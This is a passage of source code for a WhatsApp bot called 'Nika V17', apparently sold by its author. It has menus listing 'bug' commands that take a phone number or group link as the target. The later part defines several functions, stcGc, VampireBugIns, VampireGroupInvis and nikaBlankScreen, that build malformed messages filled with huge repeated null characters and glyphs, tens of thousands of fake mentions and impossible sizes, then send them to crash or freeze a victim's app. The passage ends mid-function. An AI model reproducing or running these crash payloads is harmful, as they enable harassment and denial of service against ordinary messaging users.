      displayText: '𝐷͢͞𝑒𝑣͢͡𝑒𝑙𝑜͡𝑝͢𝑒𝑟'
    }
  },
  {
    buttonId: ".tqto", 
    buttonText: {
      displayText: "𝑇͢͡ℎ͡𝑎͢𝑛͞𝑘͡𝑠 𝑇͢͞͞𝑜" 
    }
  }
];

const buttonMessage = {
    document: fs.readFileSync("./package.json"),
    mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    fileName: "𝐍𝐢𝐤𝐚𝐕𝟏𝟕𝐕𝐢𝐩☀",
    fileLength: 999999999999999,
    pageCount: 99999,
    caption: res,
    footer: foter,
    buttons: buttons,
    headerType: 1,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: `Ⓓ 𝐷𝑒𝑝𝑎𝑦𝑦 `, 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "Nika V17",  
        renderLargerThumbnail: true, 
        showAdAttribution: true, 
        sourceId: 'Nika V17', 
        sourceType: 'PDF', 
        previewType: 'PDF', 
        sourceUrl: "https://www.instagram.com/Ohhdep", 
        thumbnail: fs.readFileSync('./image/nikaganteng.jpg'), 
        thumbnailUrl: "https://files.catbox.moe/67f7yg.jpg", 
        title: '𝐍𝐢𝐤𝐚𝐕𝟏𝟕𝐕𝐢𝐩☀',
      },
    },
    viewOnce: true,
    headerType: 6
  };

const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'Aksi dengan flow' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "",
                    sections: [
                        {
                            title: "͢͞𝑁͢𝑖͡𝑘͢͞𝑎 𝑀͢𝑒͡𝑛͞𝑢",
                            highlight_label: "Premium Acces",
                            rows: [
                                {
                                    header: "𝐵͢𝑢͡𝑔 𝑀͢𝑒͡𝑛͢͞𝑢",
                                    title: "",
                                    description: "",
                                    id: ".bugmenu"
                                  },
                                ]},
                              {
                               title: `𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮`, 
                                highlight_label: `Owner Acces`,
                                rows: [
                                 {
                                    header: "𝑂͢͞𝑤͢͡𝑛𝑒͢͡𝑟 𝑀͢𝑒͡𝑛͢͞𝑢",
                                    title: "",
                                    description: "",
                                    id: ".ownermenu"
                                  },
                                ]},
                              {
                               title: `𝐅𝐮𝐧 𝐌𝐞𝐧𝐮`, 
                                highlight_label: `Public Acces`,
                                rows: [
                                 {
                                    header: "𝐹͢𝑢͢͡͞𝑛 𝑀͢𝑒͡𝑛͢𝑢",
                                    title: "",
                                    description: "",
                                    id: ".funmenu"   
                                }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

return await depayy.sendMessage(m.chat, buttonMessage, { quoted: lol });
})()
}
break

case 'bugmenu': {
await depayy.sendMessage(m.chat, { react: { text: "☀️",key: m.key,}})
let timestamp = speed();
let latensi = speed() - timestamp;
let res = `ⓘ こんにちは、私はニカです。あなたを助ける準備ができているボットです。⚠︎
╔⚍━ ⌜\`𝐁𝐔𝐆 𝐌𝐄𝐍𝐔\` ⌟ ➯
║Θ Creator : Depayy
║Θ BotName : Nikaa
║Θ Version : *17Vip*
║Θ Runtime : *${runtime(process.uptime())}* 
║Θ Type : Case
║\`[ ♛ 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂 ♛ ]\`
╚⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚎⚎⚍⚎➯
╔⚍━ ⌜\`〔 𝗜𝗻𝘃𝗶𝘀 𝗙𝗼𝗿𝗰𝗹𝗼𝘀𝗲 〕\` ⌟ ➯
║⊘ .nikaximprove 628xxx
║⊘ .nika-invisbeta 628xxx
║⊘ .nika-forx 628xxx
╚⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚎⚎⚍⚎➯
╔⚍━ ⌜\`〔 𝗜𝗻𝘃𝗶𝘀 𝗙𝗼𝗿𝗰𝗹𝗼𝘀𝗲 𝗛𝗮𝗿𝗱 〕\` ⌟ ➯
║⊘ .galaxy-impact 628xxx
║⊘ .spaming-forc 628xxx
║⊘ .nika-force 628xxx
╚⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚎⚎⚍⚎➯
╔⚍━ ⌜\`〔 𝗜𝗻𝘃𝗶𝘀 𝗗𝗲𝗹𝗮𝘆 〕\` ⌟ ➯
║⊘ .nika-delay 628xxx
║⊘ .delay-ghost 628xxx
║⊘ .delayhard-invis 628xxx
╚⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚎⚎⚍⚎➯
╔⚍━ ⌜\`〔 𝗕𝘂𝗹𝗹𝗱𝗼𝘇𝗲𝗿𝘀 〕\` ⌟ ➯
║⊘ .nika-bulldo 628xxx
║⊘ .nika-absorb 628xxx
║⊘ .nika-suck 628xxx
╚⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚎⚎⚍⚎➯
╔⚍━ ⌜\`〔 𝗕𝘂𝗴 𝗚𝗿𝗼𝘂𝗽 〕\` ⌟ ➯
║⊘ .nika-killgb [ link group ]
║⊘ .nika-blankgb [ link group ]
║⊘ .nika-delaygb [ link group ]
║⊘ .nika-group [ forclose gb ]
╚⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚎⚎⚍⚎➯
╔⚍━ ⌜\`〔 𝗕𝘂𝗴 𝗦𝗮𝗹𝘂𝗿𝗮𝗻 〕\` ⌟ ➯
║⊘ .nika-killch [ id@newsletter ]
║⊘ .nika-fcsaluran [ id@newsletter ]
╚⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚎⚎⚍⚎➯`
async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};


 (async () => {

const buttons = [
  {
    buttonId: ".owner", 
    buttonText: { 
      displayText: '𝐷͢͞𝑒𝑣͢͡𝑒𝑙𝑜͡𝑝͢𝑒𝑟'
    }
  },
  {
    buttonId: ".tqto", 
    buttonText: {
      displayText: "𝑇͢͡ℎ͡𝑎͢𝑛͞𝑘͡𝑠 𝑇͢͞͞𝑜" 
    }
  }
];

const buttonMessage = {
    document: fs.readFileSync("./package.json"),
    mimetype: "image/png",
    fileName: "𝐍𝐢𝐤𝐚𝐕𝟏𝟕𝐕𝐢𝐩☀",
    fileLength: 999999999999999,
    pageCount: 99999,
    jpegThumbnail: (await resize (fs.readFileSync('./image/jirlah.jpg'), 400, 400)),
    caption: res,
    footer: 'Ⓓ 𝐷𝑒𝑝𝑎𝑦𝑦',
    buttons: buttons,
    headerType: 1,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: `Ⓓ 𝐷𝑒𝑝𝑎𝑦𝑦 `, 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "Nika V17",  
        renderLargerThumbnail: true, 
        showAdAttribution: true, 
        sourceId: 'Nika V17', 
        sourceType: 'PDF', 
        previewType: 'PDF', 
        sourceUrl: "https://www.instagram.com/Ohhdep", 
        thumbnail: fs.readFileSync('./image/nikaganteng.jpg'), 
        thumbnailUrl: "https://files.catbox.moe/67f7yg.jpg", 
        title: '𝐍𝐢𝐤𝐚𝐕𝟏𝟕𝐕𝐢𝐩☀',
      },
    },
    viewOnce: true,
    headerType: 6
  };

const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'Aksi dengan flow' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "",
                    sections: [
                        {
                            title: "͢͞𝑁͢𝑖͡𝑘͢͞𝑎 𝑀͢𝑒͡𝑛͞𝑢",
                            highlight_label: "Premium Acces",
                            rows: [
                                {
                                    header: "𝐵͢𝑢͡𝑔 𝑀͢𝑒͡𝑛͢͞𝑢",
                                    title: "",
                                    description: "",
                                    id: ".bugmenu"
                                  },
                                ]},
                              {
                               title: `𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮`, 
                                highlight_label: `Owner Acces`,
                                rows: [
                                 {
                                    header: "𝑂͢͞𝑤͢͡𝑛𝑒͢͡𝑟 𝑀͢𝑒͡𝑛͢͞𝑢",
                                    title: "",
                                    description: "",
                                    id: ".ownermenu"
                                  },
                                ]},
                              {
                               title: `𝐅𝐮𝐧 𝐌𝐞𝐧𝐮`, 
                                highlight_label: `Public Acces`,
                                rows: [
                                 {
                                    header: "𝐹͢𝑢͢͡͞𝑛 𝑀͢𝑒͡𝑛͢𝑢",
                                    title: "",
                                    description: "",
                                    id: ".funmenu"   
                                }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

return await depayy.sendMessage(m.chat, buttonMessage, { quoted: lol });
})()
}
break

case 'ownermenu': {
await depayy.sendMessage(m.chat, { react: { text: "☀️",key: m.key,}})
let timestamp = speed();
let latensi = speed() - timestamp;
let res = `ⓘ こんにちは、私はニカです。あなたを助ける準備ができているボットです。⚠︎
╔⚍━ ⌜\`𝙏𝙍𝘼𝙎𝙃-𝘾𝙊𝙍𝙀\` ⌟ ➯
║Θ Creator : Depayy
║Θ BotName : Nikaa
║Θ Version : *17Vip*
║Θ Runtime : *${runtime(process.uptime())}* 
║Θ Type : Case
║\`[ ♛ 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂 ♛ ]\`
╚⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚎⚎⚍⚎➯
╔⚍━ ⌜\`〔 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂 〕\` ⌟ ➯
║⊘ .addowner
║⊘ .delowner
║⊘ .addmurbug
║⊘ .delmurbug
║⊘ .self
║⊘ .public
╚⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚎⚎⚍⚎➯`
async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};


 (async () => {

const buttons = [
  {
    buttonId: ".owner", 
    buttonText: { 
      displayText: '𝐷͢͞𝑒𝑣͢͡𝑒𝑙𝑜͡𝑝͢𝑒𝑟'
    }
  },
  {
    buttonId: ".tqto", 
    buttonText: {
      displayText: "𝑇͢͡ℎ͡𝑎͢𝑛͞𝑘͡𝑠 𝑇͢͞͞𝑜" 
    }
  }
];

const buttonMessage = {
    document: fs.readFileSync("./package.json"),
    mimetype: "image/png",
    fileName: "𝐍𝐢𝐤𝐚𝐕𝟏𝟕𝐕𝐢𝐩☀",
    fileLength: 999999999999999,
    pageCount: 99999,
    jpegThumbnail: (await resize (fs.readFileSync('./image/jirlah.jpg'), 400, 400)),
    caption: res,
    footer: 'Ⓓ 𝐷𝑒𝑝𝑎𝑦𝑦',
    buttons: buttons,
    headerType: 1,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: `Ⓓ 𝐷𝑒𝑝𝑎𝑦𝑦 `, 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "Nika V17",  
        renderLargerThumbnail: true, 
        showAdAttribution: true, 
        sourceId: 'Nika V11', 
        sourceType: 'PDF', 
        previewType: 'PDF', 
        sourceUrl: "https://www.instagram.com/Ohhdep", 
        thumbnail: fs.readFileSync('./image/nikaganteng.jpg'), 
        thumbnailUrl: "https://files.catbox.moe/67f7yg.jpg", 
        title: '𝐍𝐢𝐤𝐚𝐕𝟏𝟕𝐕𝐢𝐩☀',
      },
    },
    viewOnce: true,
    headerType: 6
  };

const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'Aksi dengan flow' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "",
                    sections: [
                        {
                            title: "͢͞𝑁͢𝑖͡𝑘͢͞𝑎 𝑀͢𝑒͡𝑛͞𝑢",
                            highlight_label: "Premium Acces",
                            rows: [
                                {
                                    header: "𝐵͢𝑢͡𝑔 𝑀͢𝑒͡𝑛͢͞𝑢",
                                    title: "",
                                    description: "",
                                    id: ".bugmenu"
                                  },
                                ]},
                              {
                               title: `𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮`, 
                                highlight_label: `Owner Acces`,
                                rows: [
                                 {
                                    header: "𝑂͢͞𝑤͢͡𝑛𝑒͢͡𝑟 𝑀͢𝑒͡𝑛͢͞𝑢",
                                    title: "",
                                    description: "",
                                    id: ".ownermenu"
                                  },
                                ]},
                              {
                               title: `𝐅𝐮𝐧 𝐌𝐞𝐧𝐮`, 
                                highlight_label: `Public Acces`,
                                rows: [
                                 {
                                    header: "𝐹͢𝑢͢͡͞𝑛 𝑀͢𝑒͡𝑛͢𝑢",
                                    title: "",
                                    description: "",
                                    id: ".funmenu"   
                                }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

return await depayy.sendMessage(m.chat, buttonMessage, { quoted: lol });
})()
}
break

case 'funmenu': {
await depayy.sendMessage(m.chat, { react: { text: "☀️",key: m.key,}})
let timestamp = speed();
let latensi = speed() - timestamp;
let res = `ⓘ こんにちは、私はニカです。あなたを助ける準備ができているボットです。⚠︎
╔⚍━ ⌜\`𝙏𝙍𝘼𝙎𝙃-𝘾𝙊𝙍𝙀\` ⌟ ➯
║Θ Creator : Depayy
║Θ BotName : Nikaa
║Θ Version : *17Vip*
║Θ Runtime : *${runtime(process.uptime())}* 
║Θ Type : Case
║\`[ ♛ 𝗙𝘂𝗻 𝗠𝗲𝗻𝘂 ♛ ]\`
╚⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚎⚎⚍⚎➯
╔⚍━ ⌜\`〔 𝗙𝘂𝗻 𝗠𝗲𝗻𝘂 〕\` ⌟ ➯
║⊘ .tiktok
║⊘ .tourl
║⊘ .hentaineko
║⊘ .qc
║⊘ .cekkhodam
║⊘ .cekganteng
║⊘ .sertifikattolol
║⊘ .cekidch
╚⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚎⚎⚍⚎➯`
async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};


 (async () => {

const buttons = [
  {
    buttonId: ".owner", 
    buttonText: { 
      displayText: '𝐷͢͞𝑒𝑣͢͡𝑒𝑙𝑜͡𝑝͢𝑒𝑟'
    }
  },
  {
    buttonId: ".tqto", 
    buttonText: {
      displayText: "𝑇͢͡ℎ͡𝑎͢𝑛͞𝑘͡𝑠 𝑇͢͞͞𝑜" 
    }
  }
];

const buttonMessage = {
    document: fs.readFileSync("./package.json"),
    mimetype: "image/png",
    fileName: "𝐍𝐢𝐤𝐚𝐕𝟏𝟕𝐕𝐢𝐩☀",
    fileLength: 999999999999999,
    pageCount: 99999,
    jpegThumbnail: (await resize (fs.readFileSync('./image/jirlah.jpg'), 400, 400)),
    caption: res,
    footer: 'Ⓓ 𝐷𝑒𝑝𝑎𝑦𝑦',
    buttons: buttons,
    headerType: 1,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: `Ⓓ 𝐷𝑒𝑝𝑎𝑦𝑦 `, 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "Nika 𝐕𝟏𝟕",  
        renderLargerThumbnail: true, 
        showAdAttribution: true, 
        sourceId: 'Nika V17', 
        sourceType: 'PDF', 
        previewType: 'PDF', 
        sourceUrl: "https://www.instagram.com/Ohhdep", 
        thumbnail: fs.readFileSync('./image/nikaganteng.jpg'), 
        thumbnailUrl: "https://files.catbox.moe/67f7yg.jpg", 
        title: '𝐍𝐢𝐤𝐚𝐕𝟏𝟕𝐕𝐢𝐩☀',
      },
    },
    viewOnce: true,
    headerType: 6
  };

const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'Aksi dengan flow' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "",
                    sections: [
                        {
                            title: "͢͞𝑁͢𝑖͡𝑘͢͞𝑎 𝑀͢𝑒͡𝑛͞𝑢",
                            highlight_label: "Premium Acces",
                            rows: [
                                {
                                    header: "𝐵͢𝑢͡𝑔 𝑀͢𝑒͡𝑛͢͞𝑢",
                                    title: "",
                                    description: "",
                                    id: ".bugmenu"
                                  },
                                ]},
                              {
                               title: `𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮`, 
                                highlight_label: `Owner Acces`,
                                rows: [
                                 {
                                    header: "𝑂͢͞𝑤͢͡𝑛𝑒͢͡𝑟 𝑀͢𝑒͡𝑛͢͞𝑢",
                                    title: "",
                                    description: "",
                                    id: ".ownermenu"
                                  },
                                ]},
                              {
                               title: `𝐅𝐮𝐧 𝐌𝐞𝐧𝐮`, 
                                highlight_label: `Public Acces`,
                                rows: [
                                 {
                                    header: "𝐹͢𝑢͢͡͞𝑛 𝑀͢𝑒͡𝑛͢𝑢",
                                    title: "",
                                    description: "",
                                    id: ".funmenu"   
                                }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

return await depayy.sendMessage(m.chat, buttonMessage, { quoted: lol });
})()
}
break

case 'tqto': {
await depayy.sendMessage(m.chat, { react: { text: "✨",key: m.key,}})
let teks = `
╔⚍━ ⌜\`( 𝙏𝙃𝘼𝙉𝙆𝙎 𝙏𝙊 )\` ⌟ ➯
║Depayy *[ Creator ]*
║DanzMods *[ Partner ]*
║Rans *[ Bestfriend ]*
║Rafly *[ BabangDepay ]*
║Corzaa *[ BestFriend ]*
║Rapli *[ BestFriend ]*
║Raflie *[ BestFriend ]*
║Manz *[ PartnerDepay ]*
║Ara *[ PartnerDepay ]*
║Denny *[ PartnerDepay ]*
║Zan *[ PartnerDepay ]*
║Tata *[ PartnerDepay ]*
║Rizz *[ PartnerDepay ]*
║Asep *[ PartnerDepay ]*
║Evil Cyt *[ PartnerDepay ]*
║Tiger Store *[ PartnerDepay ]*
║Yanz Store *[ PartnerDepay ]*
║Rexx *[ PartnerDepay ]*
║Rans *[ BestFriend ]*
║ZallDevMikasa *[ Friend ]*
║Vampire *[ Idola ]*
║DrayXD *[ Idola ]*
║Kaizi *[ Idola ]*
║RapippModss *[ Idola ]*
║TraaMoods *[ Idola ]*
║Ditchie *[ idola ]*
╚⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚍⚎⚎⚎⚍⚎➯
`
 let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "© Nika"
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Buy Script\",\"url\":\"https://wa.me/6281257180104\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Info Script\",\"url\":\"https://whatsapp.com/channel/0029Vb5A6y1HwXbB95V5Az2u\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: lol}) 
await depayy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})	
}  
break 

case "owner": {
await depayy.sendMessage(m.chat, { react: { text: "✨",key: m.key,}}); 
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./image/nika.jpg") }, { upload: depayy.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `*DeveloperNika*`,
}), 
contextInfo: {}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Depayy`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                 
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Whatsapp Depay\",\"url\":\"https://wa.me/6283892852523\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"https://t.me/Yamaguchihost\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Saluran Info\",\"url\":\"https://whatsapp.com/channel/0029VbCSjZv9Bb62lRhDCy1y\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {quoted: lol})
await depayy.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}

break
// END 
//Function Bug Group
async function stcGc(target) {
        let sticker = []
        for (let anu = 0; anu < 1000; anu++) {
            sticker.push({
                fileName: '8kblA1s0k900pbLI6X2S6Y7uSr-r751WIUrQOt5-A3k=.webp',
                isAnimated: true,
                DataBaseNikaibilityLabel: '',
                isLottie: false,
                mimetype: 'image/webp'
            })
        }
        const Msg = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    },
                    stickerPackMessage: {
                        stickerPackId: "76cd3656-3c76-4109-9b37-62c8a668329f",
                        name: "WOI GRUP KONTOL",
                        publisher: "",
                        stickers: sticker,
                        fileLength: "999999999999999",
                        fileSha256: "NURKD/76ZOetxqc+V8dT/zJYRhpHZi9FYgAGNzdQQyM=",
                        fileEncSha256: "/CkFScxebuRGVejPQ8NE0ounWX35rtq+PmkweWejtEs=",
                        mediaKey: "AEkmhMTtPLPha2rHdxtWQtqXBH+g9Jo/+gUw1erHM9s=",
                        directPath: "/v/t62.15575-24/29442218_1217419543131080_7836347641742653699_n.enc?ccb=11-4&oh=01_Q5Aa1QEZWzSJqGIwOUkeDSvpdnDSvVIvGUyVvW_uvgP5uTOePQ&oe=68403E51&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "99999999",
                        trayIconFileName: "e846de1c-ff5f-4768-9ed4-a3ed1c531fe0.png",
                        thumbnailDirectPath: "AjvV1BsQbp1IdsGb4sO/F1O8N6w60Pi2bgimTw/52KU=",
                        thumbnailSha256: "qRcSAXa8fdBBSrYwhAf6Gg7PkjFPbpDqHCo/Keic5O8=",
                        thumbnailEncSha256: "J7OubZTyLsE/VEQ8fRniRwyjB/fMfWbrCxXG0pGkgZ4=",
                        thumbnailHeight: 99999999999,
                        thumbnailWidth: 9999999999,
                        imageDataHash: "OWY2MjQ0MmMzNGFhZThkOTY5YWM2M2RlMzAyNjg0OGNmZTBkMTMwNTBlYmE0YzAxNzhiMDdkMTBiNzM1NzdlYg==",
                        stickerPackSize: 9999999999999,
                        stickerPackOrigin: 9999999999999,
                        contextInfo: {
                            mentionedJid: Array.from({
                                length: 30000
                            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                            isSampled: true,
                            participant: target,
                            remoteJid: target,
                            forwardingScore: 9741,
                            isForwarded: true,
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                            externalAdReply: {
                                title: "𝐃𝐄𝐏𝐀𝐘 𝐈𝐒 𝐇𝐄𝐑𝐄",
                                body: "Grup Kontol"
                            },
                        }
                    }
                }
            }
        }
        await depayy.relayMessage(target, Msg, {})
    }

//FUNCT BUG GROUP VAMPIRE, #THANKS VAMP   
async function VampireBugIns(target) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "Mode Rusuh😹" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire",
                    },
                ],
            },
        };

        await depayy.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}

async function VampireGroupInvis(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝐍𝐈𝐊𝐀 ☀" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire Official",
                    },
                ],
            },
        };

        await depayy.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
async function nikaBlankScreen(target) {
  try {
    const Depayganteng = "https://files.catbox.moe/1bugyw.jpg";
    const imagePayload = await prepareWAMessageMedia({
      image: { url: Depayganteng, gifPlayback: true }
    }, {
      upload: depayy.waUploadToServer,
      mediaType: "image"
    });
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 30000 }, () =>
            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
          ),
          isForwarded: true,
          forwardingScore: 9999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363409362506610@newsletter",
            newsletterName: "ꦾ".repeat(10000),
            serverMessageId: 1
          }
        },
        header: {
          title: "𝑫𝒆𝒑𝒂𝒚 | 𝑺𝒖𝒏𝑮𝒐𝒅𝑵𝒊𝒌𝒂..☀️",
          ...imagePayload,
          hasMediaAttachment: true
        },
        body: {
          text: "\u2063".repeat(10000)
        },
        footer: {
          text: ""
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "ꦾ".repeat(10000),
                url: "ꦾ".repeat(10000),
                merchant_url: ""
              })
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio" + "\0".repeat(10000),
                "screen_0_Dropdown_1": "Null",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { quoted: null });
    msg.key.remoteJid = target;
    msg.key.fromMe = false;
    msg.key.id = generateMessageID(); 
    await depayy.relayMessage(target, msg.message, { messageId: msg.key.id });
    console.log(`BlankScreen Delay Sent to ${target}`);
  } catch (err) {
    console.error("Error in BlankScreen:", err);
  }
}
function generateMessageID() {
  return Math.random().toString(36).slice(2) + Date.now();
}
async function Kontol(target) {
  try {
